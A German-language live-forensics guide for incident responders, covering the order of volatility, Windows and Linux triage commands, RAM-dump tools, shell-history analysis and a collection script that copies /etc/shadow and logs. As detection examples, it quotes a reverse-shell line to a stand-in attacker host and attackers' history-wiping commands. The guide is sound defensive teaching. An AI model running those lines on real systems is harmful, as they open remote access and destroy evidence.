Kurzüberblick

Live-Forensik: Du triffst ein laufendes System an. Jeder Befehl, den du ausführst, verändert Spuren. Jede Sekunde, die du wartest, kann Daten kosten. Deshalb gilt strikt: Flüchtigstes zuerst sichern — und vorher genau wissen, was du tust.

NIEMALS:
– Das System herunterfahren, ohne RAM-Dump zu machen
– Fremde USB-Sticks einstecken (Malware kann sich verbreiten)
– Das System weiter benutzen ("nur kurz was googlen")
– Lokale Tools auf dem Asservat nutzen (könnten rootkit-infiziert sein)
– Ein verschlüsseltes System herunterfahren (Schlüssel im RAM)

Order of Volatility (RFC 3227)

Die RFC 3227 definiert die Reihenfolge, in der flüchtige Daten gesichert werden müssen — von den kurzlebigsten zu den persistentesten:

RangDatenquelleLebensdauerGrößeTool / Methode
1Register, CPU-CacheNanosekundenKilobytesPraktisch nicht sicherbar (nur per JTAG/Hardware-Debugger)
2ARP-Cache, RAM-DiskSekunden bis MinutenKilobytes bis Megabytesarp -a, RAM-Dump
3Netzwerkverbindungen, Routing-TabelleMinutenKilobytesnetstat -tunap, ss -tunap, route print
4Laufende Prozesse, DiensteMinuten bis StundenKilobytesps auxf, tasklist /v, sc query
5Hauptspeicher (RAM)Bis zum AusschaltenGigabytesWinPMEM, LiME, DumpIt, Magnet RAM Capture
6Auslagerungsdateien, SwapÜber Neustart hinausGigabytespagefile.sys, swap sichern
7Festplatten / SSDsJahreTerabytesForensisches Imaging (als Letztes)
Begründung der Reihenfolge: Wenn du zuerst die Festplatte ausliest, ist der RAM vielleicht schon kaputt (weil das Disk-Imaging 4 Stunden dauert). Wenn du zuerst den RAM dumpst, überlebt die Festplatte das locker. Immer vom Flüchtigsten zum Stablisten arbeiten.

Live-System-Entscheidungen

FrageEmpfehlungBegründung
Runterfahren oder laufen lassen?Laufen lassenRAM bleibt erhalten, C2-Verbindung beobachtbar, aktive Sessions erhalten
Netzwerk trennen?Ja (bei C2-Gefahr)
Nein (bei reiner Beobachtung)		Unterbricht laufende Datenexfiltration, aber löscht aktive TCP-Sessions aus dem RAM
Verschlüsseltes System?NIEMALS herunterfahren!Schlüssel (FDE-Key, BitLocker-Masterkey) liegen nur im RAM — Herunterfahren = Schlüssel verloren
Eigene Tools auf Asservat ausführen?NEINTools vom Asservat könnten rootkit-infiziert sein und falsche Daten liefern
Dokumentation?JEDEN BEFEHL protokollierenJeder ausgeführte Befehl verändert das System. Gericht fragt: "Was genau haben Sie gemacht?"

Windows Live-Response-Kommandos

# ===== NETZWERK =====
netstat -anob                  # Alle Verbindungen mit PID und Binary
netstat -na | findstr ESTABLISHED
ipconfig /all                  # IP, DHCP, DNS, MAC
route print                    # Routing-Tabelle
arp -a                         # ARP-Cache

# ===== PROZESSE =====
tasklist /v                    # Laufende Prozesse mit Window-Title
tasklist /svc                  # Prozesse + ihre Dienste
tasklist /m                    # Geladene DLLs pro Prozess
wmic process list full         # Extrem detailliert (veraltet, aber nützlich)

# ===== DIENSTE =====
sc query state= all            # Alle Dienste und ihr Status
Get-Service | Where-Object {$_.Status -eq "Running"}

# ===== EVENTLOG =====
wevtutil qe Security /c:50 /rd:true /f:text
Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object {$_.Id -eq 4624 -or $_.Id -eq 4625}
Get-WinEvent -LogName System -MaxEvents 100 | Where-Object {$_.Id -eq 7045}

# ===== BENUTZER & SESSIONS =====
query user                     # Wer ist gerade eingeloggt?
net user                       # Lokale Benutzer
net localgroup Administratoren # Wer ist Admin?
net session                    # Netzwerk-Sessions auf diesem Rechner

# ===== SCHEDULED TASKS =====
schtasks /query /fo LIST /v

# ===== REGISTRY (flüchtige Hives) =====
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SYSTEM\CurrentControlSet\Services
Sysinternals-Schlüssel-Tools: pslist, psservice, tcpview, autorunsc, procexp (GUI) — diese Tools sind auf einem forensischen USB-Stick vorbereitet und werden nicht vom Asservat ausgeführt, sondern vom USB-Stick.

Linux Live-Response-Kommandos

# ===== SYSTEM =====
uname -a                       # Kernel-Version, Architektur, Hostname
uptime                         # Wie lange läuft das System schon?
date                           # Aktuelle Systemzeit (UTC?)
df -h                          # Belegter Speicher
mount                          # Alle gemounteten Dateisysteme

# ===== PROZESSE =====
ps auxf                        # Baumdarstellung (Eltern-Kind)
ps aux --forest                # Alternative
pstree -p                      # Noch kompakterer Baum
lsof                           # Alle offenen Dateien (File Descriptors)
lsof -i                        # Nur Netzwerk-Dateideskriptoren

# ===== NETZWERK =====
ss -tunap                      # Moderner Ersatz für netstat
netstat -tunap                 # Legacy (aber oft noch da)
ip addr                        # IP-Adressen
ip route                       # Routing-Tabelle
arp -a                         # ARP-Cache
iptables -L -n -v              # Firewall-Regeln

# ===== BENUTZER =====
who                            # Wer ist eingeloggt?
w                              # Mit Aktivität
last -n 20                     # Letzte 20 Login-Events
lastlog                        # Letzter Login pro User

# ===== /proc/ - Goldgrube! =====
cat /proc/mounts               # Mount-Info
cat /proc/modules              # Geladene Kernelmodule (Rootkits?)
cat /proc/net/tcp              # TCP-Verbindungstabelle (roh)
cat /proc/net/arp              # ARP-Tabelle
cat /proc/meminfo              # Speicherstatistik
ls -la /proc/*/fd/             # File-Deskriptoren aller Prozesse
cat /proc/sysrq-trigger        # Achtung! Kann Reboot auslösen!

# ===== DIENSTE =====
systemctl list-units --type=service --state=running
service --status-all 2>/dev/null
Wichtigster Befehl: cat /proc/*/cmdline | tr '\0' ' ' — zeigt die exakte Kommandozeile jedes laufenden Prozesses. Findet C2-Implants (z.B. bash -i >& /dev/tcp/attacker.com/4444 0>&1).

RAM-Dump-Tools

PlattformToolMethodeAusgabeformat
WindowsWinPMEM (Rekall)Kernel-Treiber liest physischen RAM ausRAW, ELF, AFF4
WindowsDumpIt (Magnet Forensics)Eigenständiges Binary, ein KlickRAW
WindowsMagnet RAM CaptureGUI-Tool, für First Responder optimiertRAW
WindowsFTK Imager"Capture Memory"-Funktion (GUI).mem (RAW)

# ===== LiME (Linux) =====
# Kernel-Modul laden und RAM in Datei + über Netzwerk streamen
sudo insmod lime.ko path=/mnt/evidence/ram.lime format=lime
# Variante: Über Netzwerk an Collector schicken
sudo insmod lime.ko path=tcp:4444 format=lime

# ===== WinPMEM (Windows) =====
# Als Administrator:
winpmem.exe -o C:\evidence\ram.aff4 -d aff4

# ===== avml (Linux, Userland) =====
avml /mnt/evidence/ram.lime
RAM-Dump verändert RAM! Jedes Tool, das RAM ausliest, muss selbst in den RAM geladen werden und belegt Speicher. Bei LiME sind das ~0.5-2 MB Verlust, bei WinPMEM ähnlich. Das ist akzeptiert und muss im Bericht dokumentiert werden.

Shell-History — die Timeline des Angreifers

Shell-History-Dateien sind eine Goldgrube für die Rekonstruktion von Angreifer-Aktivitäten:

ShellDateiFormat / Besonderheit
Bash~/.bash_historyEine Zeile pro Befehl, kein Zeitstempel (ausser HISTTIMEFORMAT ist gesetzt)
Zsh~/.zsh_historyFormat: : timestamp:duration;befehl — enthält Zeitstempel und Ausführungsdauer
PowerShell (Win)%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txtPSReadLine (PowerShell 5.0+) speichert Befehle mit Historie
PowerShell (Win, Legacy)EventLog: Event ID 4104 (Script Block Logging)Nur wenn Script Block Logging aktiviert ist
MySQL-Client~/.mysql_historySQL-Statements — kann Passwörter in CREATE USER/GRANT enthalten
Redis~/.rediscli_historyRedis-Kommandos
# Bash-History suchen (auch root!)
find / -name ".bash_history" -exec ls -la {} \; -exec tail -20 {} \; 2>/dev/null

# Zsh-History mit Zeitstempeln extrahieren
grep -E "^:" ~/.zsh_history | while IFS=':;' read _ ts dur cmd; do
  echo "$(date -d @$ts '+%Y-%m-%d %H:%M:%S') $cmd"
done

# Powershell-History (auf Windows-Image offline)
cat /mnt/evidence/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt 2>/dev/null
Angreifer löschen History: history -c && rm ~/.bash_history oder unset HISTFILE sind Standard-Anti-Forensik. Fehlt die History-Datei komplett oder ist sie ungewöhnlich kurz, ist das selbst ein Hinweis (Log-Wiping). Im RAM-Dump können gelöschte History-Einträge noch vorhanden sein.

Praktische Anwendung: Live-Response-Script (Linux)

#!/bin/bash
# live-response.sh — Forensisches Live-Response-Skript (Linux)
# Verwendung: bash live-response.sh /mnt/evidence/Fall001/

set -e
OUTDIR="${1:-/tmp/live-response}"
TIMESTAMP=$(date -u +%Y%m%d_%H%M%S_UTC)
HOSTNAME=$(hostname)
CASEDIR="$OUTDIR/${HOSTNAME}_$TIMESTAMP"
mkdir -p "$CASEDIR"
LOG="$CASEDIR/00_log.txt"

echo "=== LIVE RESPONSE START: $(date -u) ===" | tee "$LOG"
echo "Ermittler: $(whoami)" | tee -a "$LOG"
echo "System: $(uname -a)" | tee -a "$LOG"
echo "Uptime: $(uptime)" | tee -a "$LOG"

# 1. RAM-Dump (allererster Schritt!)
echo "[1/8] RAM-Dump..." | tee -a "$LOG"
if [ -f /usr/lib/lime/lime.ko ]; then
  insmod /usr/lib/lime/lime.ko path="$CASEDIR/ram.lime" format=lime
  echo "LiME geschrieben: $CASEDIR/ram.lime" | tee -a "$LOG"
else
  echo "WARNUNG: Kein LiME-Modul gefunden, RAM-Dump übersprungen!" | tee -a "$LOG"
fi

# 2. Netzwerk-Informationen
echo "[2/8] Netzwerk sichern..." | tee -a "$LOG"
ss -tunap > "$CASEDIR/01_netstat_ss.txt" 2>&1
ip addr > "$CASEDIR/02_ip_addr.txt" 2>&1
ip route > "$CASEDIR/03_ip_route.txt" 2>&1
arp -a > "$CASEDIR/04_arp_cache.txt" 2>&1
iptables-save > "$CASEDIR/05_iptables.txt" 2>&1

# 3. Prozesse
echo "[3/8] Prozesse sichern..." | tee -a "$LOG"
ps auxf > "$CASEDIR/06_ps_auxf.txt" 2>&1
lsof > "$CASEDIR/07_lsof.txt" 2>&1
for pid_dir in /proc/[0-9]*; do
  pid=$(basename "$pid_dir")
  cat "$pid_dir/cmdline" 2>/dev/null | tr '\0' ' ' >> "$CASEDIR/08_cmdline_all.txt"
  echo "" >> "$CASEDIR/08_cmdline_all.txt"
done

# 4. Benutzer & Sessions
echo "[4/8] Benutzer sichern..." | tee -a "$LOG"
who > "$CASEDIR/09_who.txt" 2>&1
last -n 100 > "$CASEDIR/10_last.txt" 2>&1
cat /etc/passwd > "$CASEDIR/11_passwd.txt" 2>&1
cat /etc/shadow > "$CASEDIR/11_shadow.txt" 2>&1

# 5. Shell-History
echo "[5/8] History-Dateien sichern..." | tee -a "$LOG"
find / -maxdepth 5 -name ".*history" -exec cp --parents {} "$CASEDIR/history/" \; 2>/dev/null

# 6. Geladene Kernel-Module (Rootkit-Suche)
echo "[6/8] Kernelmodule sichern..." | tee -a "$LOG"
lsmod > "$CASEDIR/12_lsmod.txt" 2>&1
cat /proc/modules > "$CASEDIR/13_proc_modules.txt" 2>&1

# 7. Mount- und Dateisystem-Info
echo "[7/8] Dateisystem-Info sichern..." | tee -a "$LOG"
mount > "$CASEDIR/14_mount.txt" 2>&1
df -h > "$CASEDIR/15_df.txt" 2>&1
lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,MODEL,SERIAL > "$CASEDIR/16_lsblk.txt" 2>&1

# 8. Logs kopieren
echo "[8/8] Logs kopieren..." | tee -a "$LOG"
cp -r /var/log "$CASEDIR/var_log" 2>/dev/null

# HASH-Protokoll
echo "=== HASH-PROTOKOLL ===" | tee -a "$LOG"
cd "$OUTDIR"
find "${HOSTNAME}_$TIMESTAMP" -type f -exec sha256sum {} \; > "${HOSTNAME}_$TIMESTAMP/sha256_manifest.txt" 2>/dev/null
sha256sum "${HOSTNAME}_$TIMESTAMP/sha256_manifest.txt" | tee -a "$LOG"

echo "=== LIVE RESPONSE ENDE: $(date -u) ===" | tee -a "$LOG"
echo "Alle Daten gespeichert in: $CASEDIR"
Wichtige Annahmen: Dieses Skript wird von einem forensischen USB-Stick ausgeführt (gemountet unter /mnt/evidence). Es läuft NICHT vom Asservat selbst. Das Skript erzeugt ein SHA-256-Manifest aller gesammelten Dateien für die Chain of Custody.
